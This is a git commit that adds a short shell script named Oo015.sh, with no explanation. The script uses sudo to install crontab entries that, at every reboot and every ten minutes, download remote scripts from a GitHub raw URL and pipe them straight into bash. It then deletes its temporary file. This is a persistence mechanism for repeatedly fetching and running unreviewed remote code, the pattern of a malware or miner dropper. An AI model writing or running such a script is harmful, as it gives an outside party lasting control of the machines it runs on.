cbe07724caa11d8565b2c163be552d31bc4fd73c
junscapital <52300722+junscapital@users.noreply.github.com>
2021-12-08 13:49:11 +0800

    Create Oo015.sh

---
+++ Oo015.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+sudo su
+echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/O0350.sh | bash
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
